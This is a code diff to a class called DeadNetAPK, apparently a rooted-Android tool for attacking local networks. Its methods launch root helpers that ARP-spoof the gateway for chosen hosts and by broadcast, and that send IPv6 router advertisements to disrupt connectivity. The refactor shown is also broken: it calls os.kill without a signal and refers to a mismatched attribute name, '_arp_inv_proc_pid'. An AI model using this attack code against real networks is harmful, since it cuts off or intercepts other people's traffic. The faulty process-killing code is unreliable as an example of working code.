@@ -128,77 +128,43 @@ class DeadNetAPK:
         self._do_ipv4_attack(host_ip)
 
     def _ipv4_arp_ind_attack(self) -> None:
-        self._arp_ind_proc = subprocess.Popen(
+        self._arp_ind_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
              f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._executor_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        )
-
-    def _terminate_ipv4_arp_ind(self):
-        try:
-            if self._arp_ind_proc and self._arp_ind_proc.poll() is None:
-                self._arp_ind_proc.terminate()  # SIGTERM
-                try:
-                    self._arp_ind_proc.kill()   # SIGKILL
-                except Exception as e:
-                    pass
-                self._arp_ind_proc.wait()  # wait for it to actually exit
-                self._arp_ind_proc = None
-        except Exception as e:
-            # todo add log here
-            Logger.error(f"unable to kill ipv4_arp_ind: {e} - {traceback.format_exc()}")
+        ).pid
 
     def _ipv4_arp_bcast_attack(self) -> None:
-        self._arp_bcast_proc = subprocess.Popen(
+        self._arp_bcast_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} "
              f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._executor_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        )
-
-    def _terminate_ipv4_arp_bcast(self):
-        try:
-            if self._arp_bcast_proc and self._arp_bcast_proc.poll() is None:
-                self._arp_bcast_proc.terminate()  # SIGTERM
-                try:
-                    self._arp_bcast_proc.kill()   # SIGKILL
-                except Exception as e:
-                    pass
-                self._arp_bcast_proc.wait()  # wait for it to actually exit
-                self._arp_bcast_proc = None
-        except Exception as e:
-            # todo add log here
-            Logger.error(f"unable to kill ipv4_arp_bcast: {e} - {traceback.format_exc()}")
+        ).pid
 
     def _ipv6_nra_attack(self) -> None:
         # subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
         #                  f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
         #                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         # TODO add sleep and loop
-        self._nra_proc = subprocess.Popen(
+        self._nra_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
              f"{self._ipv6_preflen} {self._executor_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        )
+        ).pid
 
-    def _terminate_ipv6_nra_attack(self):
+    @staticmethod
+    def _kill_pid(pid: int):
         try:
-            if self._nra_proc and self._nra_proc.poll() is None:
-                self._nra_proc.terminate()  # SIGTERM
-                try:
-                    self._nra_proc.kill()   # SIGKILL
-                except Exception as e:
-                    pass
-                self._nra_proc.wait()  # wait for it to actually exit
-                self._nra_proc = None
+            os.kill(pid)
         except Exception as e:
             # todo add log here
-            Logger.error(f"unable to kill nra_proc: {e} - {traceback.format_exc()}")
+            Logger.error(f"unable to kill {pid}: {e} - {traceback.format_exc()}")
 
     def _start_workers_attack_loop(self) -> None:
         # todo rename method name
@@ -221,9 +187,8 @@ class DeadNetAPK:
         self._terminate_all_attacks()
 
     def _terminate_all_attacks(self):
-        self._terminate_ipv4_arp_ind()
-        self._terminate_ipv4_arp_bcast()
-        self._terminate_ipv6_nra_attack()
+        for pid in [self._nra_proc_pid, self._arp_bcast_proc_pid, self._arp_inv_proc_pid]:
+            self._kill_pid(pid)
 
     def start_attack(self) -> None:
         try:
